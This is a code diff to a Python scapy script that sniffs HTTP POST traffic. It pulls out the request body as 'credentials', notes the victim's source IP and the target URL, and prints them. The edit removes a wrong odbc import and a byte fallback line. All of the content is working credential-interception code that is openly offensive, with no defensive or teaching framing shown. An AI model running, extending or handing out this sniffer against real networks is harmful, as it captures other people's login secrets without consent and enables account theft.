@@ -1,7 +1,5 @@
 #!/bin/python3
 import argparse
-
-from odbc import RAW
 from scapy.layers.http import HTTPRequest
 from scapy.layers.inet import IP
 from scapy.packet import Raw
@@ -22,13 +20,14 @@ class bcolors:
 
 def credentialsSniffing(packet):
     try:
-        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST" and packet.haslayer(RAW):
+        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
             url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
             ipVictim = packet[IP].src
             try:
                 credentials = packet[Raw].load.decode("utf-8")
             except:
-                credentials = packet[Raw].load
+                #credentials = packet[Raw].load
+                pass
 
             print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
             print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}{bcolors.ENDC}")
